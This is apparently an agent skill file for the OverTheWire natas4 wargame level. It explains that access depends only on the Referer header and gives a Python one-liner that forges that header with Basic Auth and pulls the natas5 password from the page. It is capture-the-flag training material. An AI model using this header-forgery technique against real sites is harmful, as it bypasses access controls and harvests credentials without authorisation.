---
name: natas-4
description: >-
  Use when solving OverTheWire natas4: given natas4 credentials, forge a Referer
  header to http://natas5.natas.labs.overthewire.org/ and extract the natas5
  password from the response.
---
# natas4

**Input:** username and password for natas4.

**Weakness:** access is gated only by checking the HTTP `Referer` header for `http://natas5.natas.labs.overthewire.org/`. Referer is client-controlled and trivial to forge.

**Network:** run on a host that can reach `natas4.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. Derive the natas5 password (never hardcode it). Replace `USER` and `PASS` with the natas4 credentials:

```bash
python -c "import base64,re,urllib.request;u,p='USER','PASS';hdr={'Authorization':'Basic '+base64.b64encode((u+':'+p).encode()).decode(),'Referer':'http://natas5.natas.labs.overthewire.org/'};r=urllib.request.Request('http://natas4.natas.labs.overthewire.org/',headers=hdr);h=urllib.request.urlopen(r,timeout=30).read().decode();print(re.search(r'password for natas5 is (\S+)',h).group(1))"
```

2. The printed string is the natas5 password.

3. Confirm by GETting `http://natas5.natas.labs.overthewire.org/` with Basic Auth `natas5:<password>` and expecting HTTP 200.
